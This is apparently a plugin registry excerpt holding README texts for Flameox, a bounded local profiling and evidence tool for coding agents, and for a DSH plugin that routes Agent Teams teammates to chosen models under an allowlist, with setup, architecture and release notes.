storage, video tracking does not survive restarts. ## Development After cloning: ```sh pnpm install --frozen-lockfile pnpm check ``` `pnpm check` runs type checks, the build, tests, and CHANGELOG validation. To load the local checkout: ```sh dsh plugin --profile web add ``` After editing `src/`, run `pnpm build` and commit the generated `lib/` files with the source changes. Update both READMEs whe

plugins.description: Runtime evidence that helps agents trace, profile, and burn down hotspots in application and native code, GPU kernels, and inference stacks.
plugins.readme_text:
flameox

Bounded local runtime evidence for coding agents.

Flameox coordinates profilers, benchmark tools, trace processors, and direct local targets. It turns an explicit artifact or command into bounded evidence while keeping durable preservation optional. The agent chooses hypotheses and experiments; Flameox records observed inputs, execution provenance, typed evidence, coverage, and limitations. There is no workspace to initialize or project configuration to maintain. Pass exact artifact paths to analysis and an explicit argv plus absolute working directory to capture. Flameox does not search parent directories, edit project files, or provide a hosted service. ## Quick start Configure an MCP client with the global setup command: ```console npx flameox@latest setup ``` Setup detects supported clients and asks which configurations to update. For automation, select clients explicitly, for example `--client codex --yes` or `--all --yes`; `--dry-run` reports the paths and actions without writing. Setup preserves unrelated client configuration and does not change project files. See [the npm package guide](npm/README.md) for details. Update existing MCP registrations with: ```console npx flameox@latest update ``` `update --check` reports available updates without changing configuration. Updates preserve each client's provider extras and settings, verify the new environment before changing release pins, and report which clients need a restart or reconnect. Use `--client codex` to select one client, or `--version 0.2.8` to select a specific release, including for rollback. The Python CLI exposes the same `flameox update` command. For direct CLI use, pass exact artifact paths or an explicit command: ```console uvx flameox analyze preview_artifact /absolute/path/to/artifact.json uvx flameox capture --provider direct --cwd "$PWD" -- python benchmark.py ``` To launch the stdio MCP server manually: ```console uvx flameox mcp serve ``` For local development, clone the repository, install its development dependencies, and inspect the available tools: ```console git clone https://github.com/morluto/flameox.git cd flameox uv sync --extra dev --extra memory --extra trace --extra cpu uv run flameox mcp inspect ``` ## Evidence and storage Analysis and unpreserved capture use bounded session scratch. Session `analysis_id` values expire when evicted or when the server stops. Explicit preservation creates the user-level Flameox data directory and stores native bytes and a canonical evidence bundle by SHA-256. Set `FLAMEOX_DATA_DIR` to choose another location. Preservation is optional; it does not imply full console-output retention. Flameox distinguishes observed, derived, and inferred claims. Profiles guide exploration but do not establish causality or performance improvement. Confirmatory claims require representative workloads, declared metrics and estimands, compatible identities, preserved samples, and a semantic oracle. ## MCP The MCP server has no workspace binding. It exposes named analysis and capture tools through the same operation registry as the CLI. Analysis tools accept explicit sources; capture tools accept a typed target and provider. Tool schemas expose operation-specific fields directly. Inspect the catalog with `flameox mcp inspect`; use `--tool TOOL_NAME` for focused schemas and examples. The complete contract and current tool catalog are in [the interface guide](docs/interfaces.md). Tools return their full bounded results inline, including failures and recovery actions. Preserved evidence has a durable `evidence_id`; `inspect_evidence` returns its redacted metadata and replay sources inline. Capture takes argv, not a shell string. A direct target supplies an absolute working directory and bounded environment overrides. Results may include `next_page`; replay its named analysis tool and arguments unchanged. Capture continuations read collected artifacts and do not rerun the target. MCP work belongs to the live request, so cancellation applies directly and no detached job survives a restart. ## Documentation - [Architecture](docs/architecture.md) describes process and package boundaries. - [Storage and evidence](docs/storage-and-evidence.md) defines preservation and provenance. - [Investigations](docs/investigations.md) covers experiments, comparison, and evidence quality. - [Adapters](docs/adapters.md) documents provider compatibility and integration policy. - [Runtime safety](docs/runtime-safety.md) covers limits, recovery, integrity, and privacy. - [Interfaces](docs/interfaces.md) defines CLI and MCP contracts. - [Testing](docs/testing.md) describes test selections and known proof gaps. ## Development Flameox requires Python 3.12 or newer and uses the committed `uv.lock`. See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and contribution guidance. ```console uv run ruff check src tests tools uv run ruff format --check src tests tools uv run mypy src tests tools uv run pytest -q ``` Flameox is licensed under the MIT License.

plugins.description: DSH plugin: let an Agent Teams Lead choose the provider, model, and reasoning effort of each teammate it spawns.
plugins.readme_text:
# Team Model Routing (`dsh-plugin-team-model-routing`)

Let an Agent Teams **Lead** choose the `provider`, `model`, and
`reasoning_effort` of each teammate it spawns, validated against the Subagent
model-selection allowlist.

## Why it needs a plugin

`spawn_teammate` (shipped) carries no route fields, and
`ctx.agentTeams.spawnTeammate()` forwards only a provider *name* to
`ctx.subagents.startContinuable()`, which is where `agentOptions` live.

A teammate is a **continuable** child: the continuation registry materializes it
through `ctx.agents.create()` and **never calls a subagent provider's
`start()`**. So wrapping a subagent provider (the obvious first idea) can never
route a teammate — the wrapper is simply never asked to start it, and the
teammate silently ends up on the inherited route.

## The seam that works

```
spawn_teammate_routed            record route by (Lead, teammate name, context)
        ↓
agentTeams.spawnTeammate(...)    shipped Team service, unchanged contract
        ↓
ctx.agents.create()              child materialized; initial prompt queued to inbox
        ↓
agent/pre-step (child scope)     ← plugin: claim route, rewrite child.options
        ↓
AgentLoop.prepareRequest()       reads this.options → request/header + assistant
                                 message source + every later step
```

Two facts make this work, both verified in the installed sources:

- `agent/pre-step` is an awaited waterfall that runs **before** `step()` →
  `prepareRequest()` (`dsh-agent-loop/lib/index.js:902-925 → 978 → 1050`).
- `prepareRequest()` reads `this.options` on **every** step
  (`dsh-agent-loop/lib/index.js:1168-1173`), and the loop and the Agent object
  share one `options` reference (`:774`, `:1739`).

The order matters in the other direction too: the child's initial prompt is
submitted *after* creation and the loop appends it to the transcript only
*inside* that first step, so the teammate name must be read from the step's
claimed messages (`payload.messages`), with the transcript as a fallback for a
resumed teammate. Reading the session snapshot at `agent/created` time finds
nothing — that was the first implementation's fatal flaw.

## Tools

| Tool | Purpose |
|---|---|
| `spawn_teammate_routed` | Same contract as `spawn_teammate`, plus `provider` / `model` / `reasoning_effort`. Omit all three to inherit the Lead route. |
| `list_teammate_models` | Lists selectable providers, then selectable models for one provider, then that model's reasoning efforts. |

Both are installed in the **Lead's own Agent scope** (never globally), so
teammates do not see them.

## Allowlist

When `@deepseek-ai/dsh-tool-subagent/model-selection-settings` is
`enabled: true`, explicit routes outside `allowedModels` are rejected **before**
the teammate is created. Pure inheritance is never restricted. An enabled but
empty allowlist makes every route unselectable rather than failing inheritance.

The route is also validated through `llm.resolveCallConfig()`, so an unknown
model or an unsupported reasoning effort fails with the adapter's own message
instead of surfacing later as a failed turn.

## Config

```yaml
- id: team-model-routing
  name: 'dsh-plugin-team-model-routing'
  config:
    toolName: spawn_teammate_routed
    listToolName: list_teammate_models
    freshProvider: spawn
    forkProvider: fork
    routeTtlMs: 120000
```

`freshProvider` / `forkProvider` are the provider names handed to the shipped
Team service; they must name registered subagent providers (`spawn`, `fork`).

## Known limits

- **The route is process-local.** It lives in the plugin's memory, so it applies
  while the child is created in this process. A teammate cold-resumed after a
  Harness **restart** falls back to the `agentOptions` recorded in its
  `subagent/descriptor`. Making that survive a restart needs a durable record and
  is the natural follow-up.
- **`agent.options` is a runtime object**, not part of the public `Agent`
  interface. The rewrite is the reason this stays a plugin rather than a
  one-line change; upstream, the clean fix is to let the provider contribute
  `agentOptions` through `ContinuableCreateSpec` (or to accept `agentOptions` on
  the team spawn request). The upstream repository does not accept external PRs
  — publish this as a `dsh-plugin`, and raise the API gap in Discussions.
- A recorded route that is never claimed (a spawn that failed before the child
  existed) expires after `routeTtlMs` and is harmless.

## Test

```sh
node packages/team-model-routing/test/logic.test.mjs
```

18 checks over route validation, allowlist enforcement, discovery rendering, the
claim store, and teammate-name extraction. It covers `logic.js` only — the
`agent/pre-step` seam itself needs a live run.

## Install

Published as [`dsh-plugin-team-model-routing`](https://www.npmjs.com/package/dsh-plugin-team-model-routing)
on npm, source at [Lingrui98/dsh-plugin-team-model-routing](https://github.com/Lingrui98/dsh-plugin-team-model-routing).

```sh
npm install dsh-plugin-team-model-routing
```

or point the plugin manager at the installed package or a workspace directory:

```js
plugin_manager({ action: 'install_bundle', target: 'dsh-plugin-team-model-routing' })
```

Installing loads the module once; because Node caches ES modules by resolved
path, **replacing this package's code requires a Harness restart** to take
effect in a running process.

## Repository layout

```
index.js            Cordis Host plugin: tools, routing hook, Provider wiring
logic.js            dependency-free routing/claim logic (unit-tested)
cordis.patch.yml    Loader patch: this row + the tool-agent-team config
locale/{en,zh}.json Plugin Manager display metadata
test/logic.test.mjs the 18-check logic suite (not shipped in the npm tarball)
```

`npm pack` ships `index.js`, `logic.js`, `cordis.patch.yml`, `icon.svg`,
`locale/*.json`, `LICENSE`, and both READMEs.


## Verified live

Observed on the `desktop` profile, 2026-10-15, with the profile's
`subagentModelSelection` allowlist enabled:

| Check | Evidence |
|---|---|
| Route reaches the child | `spawn_teammate_routed({ provider: 'model-server', model: 'glm-5.3', reasoning_effort: 'high' })` → host log `team-model-routing: teammate "confirm-route" now runs on model-server/glm-5.3 (effort high)`, and `list_agents` reported that teammate as `model: "glm-5.3"` while the Lead was `gpt-6.1-sol` and the profile default is `bosc/deepseek-flash`. |
| `list_agents` reads the applied route | `list_agents` shows the rewritten `model` for the routed teammate, and `gpt-6.1-sol` (the inherited route) for teammates created before this plugin existed. |
| Allowlist rejects before creation | `spawn_teammate_routed({ provider: 'bosc', model: 'gpt-5.6-luna' })` → `Error: teammate LLM route "bosc/gpt-5.6-luna" is not allowed by the Subagent model-selection allowlist; allowed: model-server/glm-5.3, kimi-code/k3, bosc/gpt-5.6-sol, model-server/kimi-k3, bosc/deepseek-flash` — no teammate was created. |
| Both tools are live in the Lead scope | `Tool.listTools` lists `spawn_teammate_routed` (with `provider`/`model`/`reasoning_effort`) and `list_teammate_models`. |

Not covered by the live run: the `fork` context, and route survival across a
teammate cold-resume (see Known limits).

## Releasing a new version

The package is `dsh-plugin` shaped: `dsh.bundle.patch` points at
`cordis.patch.yml`, the manifest carries display `meta`, `icon.svg`, `locale/{en,zh}.json`,
and it is `type: module`. To release:

1. Bump `version` in `package.json` (npm rejects a re-publish of an existing version).
2. `node test/logic.test.mjs` — 18 checks must pass.
3. `npm pack --dry-run` — confirm the tarball is the 10 files listed under
   [Repository layout](#repository-layout).
4. `npm publish` — the npm account has 2FA enabled, so pass `--otp=<code>` or use a
   granular token with **bypass 2FA** enabled. When a code is needed, ask for one
   interactively rather than storing it.
5. `git commit` and `git push` the release.
6. If the package name ever changes, update the `name:` line in `cordis.patch.yml`
   to match — the Loader resolves the row by that string.
